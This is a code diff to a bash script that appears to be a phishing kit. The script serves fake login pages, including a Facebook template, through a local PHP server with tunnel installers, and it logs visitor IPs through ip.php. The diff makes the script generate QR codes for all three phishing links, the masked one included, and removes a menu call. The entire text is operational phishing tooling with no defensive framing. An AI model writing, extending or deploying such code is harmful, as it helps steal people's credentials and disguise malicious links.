@@ -308,8 +308,6 @@ setup_site() {
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-
-    tunnel_menu
 }
 
 ## Get IP address
@@ -503,16 +501,22 @@ custom_url() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 
-	# Generate QR code for the URL
-	if [[ $processed_url != *"Unable"* ]]; then
-		qrencode -o qr.png "$processed_url" 2>/dev/null
-		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL 2 generated: ${ORANGE}qr.png"
-		echo -e "${RED}[${WHITE}-${RED}]${BLUE} Scan the QR code to access the URL."
-		
-		# Optional: Display the QR code
-		display qr.png 2>/dev/null &
-	fi
+	# Generate QR codes for all URLs
+	qrencode -o qr1.png "$url" 2>/dev/null
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL 1 generated: ${ORANGE}qr1.png"
+	
+	qrencode -o qr2.png "$processed_url" 2>/dev/null
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL 2 generated: ${ORANGE}qr2.png"
+	
+	qrencode -o qr3.png "$masked_url" 2>/dev/null
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} QR Code for URL 3 generated: ${ORANGE}qr3.png"
+
+	# Optional: Display the QR codes
+	display qr1.png 2>/dev/null &
+	display qr2.png 2>/dev/null &
+	display qr3.png 2>/dev/null &
 }
+
 
 site_facebook()  {
     cat <<- EOF
@@ -821,6 +825,5 @@ install_cloudflared
 install_localxpose
 main_menu
 tunnel_menu
-
 
 
